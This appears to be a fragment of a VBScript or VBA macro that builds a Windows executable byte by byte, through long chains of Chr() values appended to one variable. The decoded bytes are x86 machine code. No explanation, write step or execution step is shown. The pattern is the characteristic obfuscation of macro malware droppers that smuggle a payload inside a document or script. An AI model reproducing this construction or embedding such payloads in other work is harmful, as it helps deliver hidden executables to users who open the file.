gfoN=gfoN&Chr(255)&Chr(214)&Chr(104)&Chr(200)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(104)&Chr(192)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(131)&Chr(61)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(84)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(116)&Chr(22)&Chr(131)&Chr(61)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(13)&Chr(131)&Chr(61)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(4)&Chr(133)&Chr(192)&Chr(117)&Chr(36)&Chr(161)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(161)&Chr(88)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(5)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(215)&Chr(32)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(204)&Chr(176)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(80)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(15)&Chr(132)&Chr(204)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(34)&Chr(240)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(19)&Chr(251)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(3)&Chr(251)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(157)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(243)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(204)&Chr(176)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(232)&Chr(227)&Chr(250)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(120)&Chr(3)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(101)&Chr(104)&Chr(203)&Chr(34)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(61)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(163)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(72)&Chr(104)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(106)&Chr(1)&Chr(232)&Chr(181)&Chr(24)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(52)&Chr(86)&Chr(255)&Chr(53)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(10)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(27)&Chr(106)&Chr(0)
gfoN=gfoN&Chr(86)&Chr(232)&Chr(231)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(78)&Chr(4)&Chr(255)&Chr(137)&Chr(6)&Chr(51)&Chr(192)&Chr(64)&Chr(235)&Chr(7)&Chr(232)&Chr(146)&Chr(251)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(51)&Chr(192)&Chr(57)&Chr(69)&Chr(8)&Chr(106)&Chr(0)&Chr(15)&Chr(148)&Chr(192)&Chr(104)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(108)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(2)&Chr(93)&Chr(195)&Chr(51)&Chr(192)&Chr(64)&Chr(163)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(204)&Chr(104)&Chr(32)&Chr(38)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(16)
gfoN=gfoN&Chr(137)&Chr(108)&Chr(36)&Chr(16)&Chr(141)&Chr(108)&Chr(36)&Chr(16)&Chr(43)&Chr(224)&Chr(83)&Chr(86)&Chr(87)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(49)&Chr(69)&Chr(252)&Chr(51)&Chr(197)&Chr(80)&Chr(137)&Chr(101)&Chr(232)&Chr(255)&Chr(117)&Chr(248)&Chr(139)&Chr(69)&Chr(252)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(248)&Chr(141)&Chr(69)&Chr(240)&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(81)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(83)&Chr(139)&Chr(93)&Chr(12)
gfoN=gfoN&Chr(86)&Chr(139)&Chr(115)&Chr(8)&Chr(51)&Chr(53)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(6)&Chr(198)&Chr(69)&Chr(255)&Chr(0)&Chr(199)&Chr(69)&Chr(244)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(123)&Chr(16)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(133)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(70)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(117)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(246)&Chr(64)&Chr(4)&Chr(102)&Chr(15)&Chr(133)&Chr(22)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(16)&Chr(141)&Chr(85)&Chr(232)&Chr(137)&Chr(83)&Chr(252)&Chr(139)&Chr(91)&Chr(12)&Chr(137)&Chr(69)&Chr(232)&Chr(137)&Chr(77)&Chr(236)&Chr(131)&Chr(251)&Chr(254)&Chr(116)&Chr(95)&Chr(141)&Chr(73)&Chr(0)
gfoN=gfoN&Chr(141)&Chr(4)&Chr(91)&Chr(139)&Chr(76)&Chr(134)&Chr(20)&Chr(141)&Chr(68)&Chr(134)&Chr(16)&Chr(137)&Chr(69)&Chr(240)&Chr(139)&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(133)&Chr(201)&Chr(116)&Chr(20)&Chr(139)&Chr(215)&Chr(232)&Chr(52)&Chr(42)&Chr(0)&Chr(0)&Chr(198)&Chr(69)&Chr(255)&Chr(1)&Chr(133)&Chr(192)&Chr(124)&Chr(64)&Chr(127)&Chr(71)&Chr(139)&Chr(69)&Chr(248)&Chr(139)&Chr(216)&Chr(131)&Chr(248)&Chr(254)&Chr(117)&Chr(206)&Chr(128)&Chr(125)&Chr(255)&Chr(0)&Chr(116)&Chr(36)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(2)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(86)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(58)&Chr(232)&Chr(242)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(244)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)
gfoN=gfoN&Chr(93)&Chr(195)&Chr(199)&Chr(69)&Chr(244)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(201)&Chr(139)&Chr(77)&Chr(8)&Chr(129)&Chr(57)&Chr(99)&Chr(115)&Chr(109)&Chr(224)&Chr(117)&Chr(41)&Chr(131)&Chr(61)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(32)&Chr(104)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(232)&Chr(195)&Chr(6)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(139)&Chr(85)&Chr(8)&Chr(106)&Chr(1)&Chr(82)&Chr(255)&Chr(21)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(196)&Chr(8)&Chr(139)&Chr(77)&Chr(12)&Chr(232)&Chr(215)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(12)&Chr(57)&Chr(88)&Chr(12)&Chr(116)&Chr(18)&Chr(104)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(211)&Chr(139)&Chr(200)&Chr(232)&Chr(218)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(12)&Chr(139)&Chr(77)&Chr(248)
gfoN=gfoN&Chr(137)&Chr(72)&Chr(12)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(111)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(86)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(58)&Chr(232)&Chr(95)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(72)&Chr(8)&Chr(139)&Chr(215)&Chr(232)&Chr(109)&Chr(41)&Chr(0)&Chr(0)&Chr(186)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(57)&Chr(83)&Chr(12)&Chr(15)&Chr(132)&Chr(82)&Chr(255)&Chr(255)&Chr(255)&Chr(104)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(203)&Chr(232)&Chr(133)&Chr(41)&Chr(0)&Chr(0)&Chr(233)&Chr(28)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(248)
gfoN=gfoN&Chr(0)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(83)&Chr(87)&Chr(191)&Chr(78)&Chr(230)&Chr(64)&Chr(187)&Chr(187)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(59)&Chr(199)&Chr(116)&Chr(13)&Chr(133)&Chr(195)&Chr(116)&Chr(9)&Chr(247)&Chr(208)&Chr(163)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(235)&Chr(96)&Chr(86)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(255)&Chr(21)&Chr(132)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(117)&Chr(252)&Chr(51)&Chr(117)&Chr(248)&Chr(255)&Chr(21)&Chr(128)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(255)&Chr(21)&Chr(124)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(141)&Chr(69)&Chr(240)&Chr(80)&Chr(255)&Chr(21)&Chr(120)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(244)&Chr(51)&Chr(69)&Chr(240)&Chr(51)&Chr(240)&Chr(59)&Chr(247)&Chr(117)&Chr(7)&Chr(190)&Chr(79)&Chr(230)
gfoN=gfoN&Chr(64)&Chr(187)&Chr(235)&Chr(11)&Chr(133)&Chr(243)&Chr(117)&Chr(7)&Chr(139)&Chr(198)&Chr(193)&Chr(224)&Chr(16)&Chr(11)&Chr(240)&Chr(137)&Chr(53)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(247)&Chr(214)&Chr(137)&Chr(53)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(94)&Chr(95)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(8)&Chr(104)&Chr(136)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(106)&Chr(253)&Chr(255)&Chr(255)&Chr(232)&Chr(94)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(64)&Chr(120)&Chr(133)&Chr(192)&Chr(116)&Chr(22)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(208)&Chr(235)&Chr(7)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(206)&Chr(40)&Chr(0)&Chr(0)&Chr(232)&Chr(131)&Chr(253)&Chr(255)&Chr(255)&Chr(195)&Chr(104)&Chr(66)&Chr(40)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(247)&Chr(255)
gfoN=gfoN&Chr(255)&Chr(89)&Chr(163)&Chr(216)&Chr(176)&Chr(64)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(191)&Chr(224)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(60)&Chr(245)&Chr(36)&Chr(161)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(30)&Chr(141)&Chr(4)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(137)&Chr(56)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(255)&Chr(48)&Chr(131)&Chr(199)&Chr(24)&Chr(232)&Chr(35)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(12)&Chr(70)&Chr(131)&Chr(254)&Chr(36)&Chr(124)&Chr(210)&Chr(51)&Chr(192)&Chr(64)&Chr(95)&Chr(94)&Chr(195)&Chr(131)&Chr(36)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(241)&Chr(139)&Chr(255)&Chr(83)&Chr(139)&Chr(29)&Chr(72)&Chr(128)&Chr(64)&Chr(0)&Chr(86)&Chr(190)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(87)&Chr(139)
gfoN=gfoN&Chr(62)&Chr(133)&Chr(255)&Chr(116)&Chr(19)&Chr(131)&Chr(126)&Chr(4)&Chr(1)&Chr(116)&Chr(13)&Chr(87)&Chr(255)&Chr(211)&Chr(87)&Chr(232)&Chr(39)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(38)&Chr(0)&Chr(89)&Chr(131)&Chr(198)&Chr(8)&Chr(129)&Chr(254)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(124)&Chr(220)&Chr(190)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(95)&Chr(139)&Chr(6)&Chr(133)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(126)&Chr(4)&Chr(1)&Chr(117)&Chr(3)&Chr(80)&Chr(255)&Chr(211)&Chr(131)&Chr(198)&Chr(8)&Chr(129)&Chr(254)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(124)&Chr(230)&Chr(94)&Chr(91)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(255)&Chr(52)&Chr(197)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(136)&Chr(128)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(168)&Chr(147)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(232)&Chr(103)&Chr(252)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(125)&Chr(228)&Chr(51)&Chr(219)&Chr(57)&Chr(29)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(117)&Chr(24)&Chr(232)&Chr(129)&Chr(237)&Chr(255)&Chr(255)&Chr(106)&Chr(30)&Chr(232)&Chr(207)&Chr(235)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(17)&Chr(233)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(139)&Chr(117)&Chr(8)&Chr(141)&Chr(52)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(57)&Chr(30)&Chr(116)&Chr(4)&Chr(139)&Chr(199)&Chr(235)&Chr(110)&Chr(106)&Chr(24)&Chr(232)&Chr(31)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(117)&Chr(15)&Chr(232)&Chr(60)&Chr(2)&Chr(0)&Chr(0)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(81)&Chr(106)&Chr(10)&Chr(232)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(89)
gfoN=gfoN&Chr(137)&Chr(93)&Chr(252)&Chr(57)&Chr(30)&Chr(117)&Chr(44)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(87)&Chr(232)&Chr(26)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(23)&Chr(87)&Chr(232)&Chr(85)&Chr(19)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(6)&Chr(2)&Chr(0)&Chr(0)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(228)&Chr(235)&Chr(11)&Chr(137)&Chr(62)&Chr(235)&Chr(7)&Chr(87)&Chr(232)&Chr(58)&Chr(19)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(255)&Chr(251)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(10)&Chr(232)&Chr(40)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(86)&Chr(141)&Chr(52)&Chr(197)
gfoN=gfoN&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(62)&Chr(0)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(34)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(17)&Chr(232)&Chr(5)&Chr(232)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(54)&Chr(255)&Chr(21)&Chr(140)&Chr(128)&Chr(64)&Chr(0)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(48)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(131)&Chr(165)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(0)&Chr(83)&Chr(106)&Chr(76)&Chr(141)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(80)&Chr(232)&Chr(249)&Chr(39)&Chr(0)&Chr(0)&Chr(141)
gfoN=gfoN&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(133)&Chr(44)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(224)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(220)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(149)&Chr(216)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(157)&Chr(212)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(181)&Chr(208)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(189)&Chr(204)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(149)&Chr(248)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(141)&Chr(236)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(157)&Chr(200)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(133)&Chr(196)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(165)&Chr(192)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(173)
gfoN=gfoN&Chr(188)&Chr(253)&Chr(255)&Chr(255)&Chr(156)&Chr(143)&Chr(133)&Chr(240)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(4)&Chr(141)&Chr(77)&Chr(4)&Chr(199)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(137)&Chr(133)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(244)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(73)&Chr(252)&Chr(137)&Chr(141)&Chr(228)&Chr(253)&Chr(255)&Chr(255)&Chr(199)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(23)&Chr(4)&Chr(0)&Chr(192)&Chr(199)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(133)&Chr(228)&Chr(252)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(156)&Chr(128)&Chr(64)&Chr(0)&Chr(106)&Chr(0)&Chr(139)&Chr(216)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(21)&Chr(152)
gfoN=gfoN&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(12)&Chr(133)&Chr(219)&Chr(117)&Chr(8)&Chr(106)&Chr(2)&Chr(232)&Chr(8)&Chr(39)&Chr(0)&Chr(0)&Chr(89)&Chr(104)&Chr(23)&Chr(4)&Chr(0)&Chr(192)&Chr(255)&Chr(21)&Chr(148)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(144)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(110)&Chr(36)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(53)&Chr(48)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(227)&Chr(244)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(93)&Chr(255)&Chr(224)&Chr(106)&Chr(2)&Chr(232)&Chr(201)&Chr(38)&Chr(0)&Chr(0)&Chr(89)&Chr(93)&Chr(233)&Chr(178)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(51)&Chr(201)&Chr(59)&Chr(4)
gfoN=gfoN&Chr(205)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(116)&Chr(19)&Chr(65)&Chr(131)&Chr(249)&Chr(45)&Chr(114)&Chr(241)&Chr(141)&Chr(72)&Chr(237)&Chr(131)&Chr(249)&Chr(17)&Chr(119)&Chr(14)&Chr(106)&Chr(13)&Chr(88)&Chr(93)&Chr(195)&Chr(139)&Chr(4)&Chr(205)&Chr(68)&Chr(162)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(5)&Chr(68)&Chr(255)&Chr(255)&Chr(255)&Chr(106)&Chr(14)&Chr(89)&Chr(59)&Chr(200)&Chr(27)&Chr(192)&Chr(35)&Chr(193)&Chr(131)&Chr(192)&Chr(8)&Chr(93)&Chr(195)&Chr(232)&Chr(89)&Chr(246)&Chr(255)&Chr(255)&Chr(133)&Chr(192)&Chr(117)&Chr(6)&Chr(184)&Chr(168)&Chr(163)&Chr(64)&Chr(0)&Chr(195)&Chr(131)&Chr(192)&Chr(8)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(83)&Chr(86)&Chr(87)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(100)&Chr(244)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(139)
gfoN=gfoN&Chr(248)&Chr(137)&Chr(125)&Chr(252)&Chr(232)&Chr(84)&Chr(244)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(59)&Chr(247)&Chr(15)&Chr(130)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(222)&Chr(43)&Chr(223)&Chr(141)&Chr(67)&Chr(4)&Chr(131)&Chr(248)&Chr(4)&Chr(114)&Chr(119)&Chr(87)&Chr(232)&Chr(187)&Chr(38)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(141)&Chr(67)&Chr(4)&Chr(89)&Chr(59)&Chr(248)&Chr(115)&Chr(72)&Chr(184)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(59)&Chr(248)&Chr(115)&Chr(2)&Chr(139)&Chr(199)&Chr(3)&Chr(199)&Chr(59)&Chr(199)&Chr(114)&Chr(15)&Chr(80)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(239)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(141)&Chr(71)&Chr(16)&Chr(59)&Chr(199)&Chr(114)&Chr(64)&Chr(80)&Chr(255)&Chr(117)&Chr(252)&Chr(232)&Chr(217)&Chr(17)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)
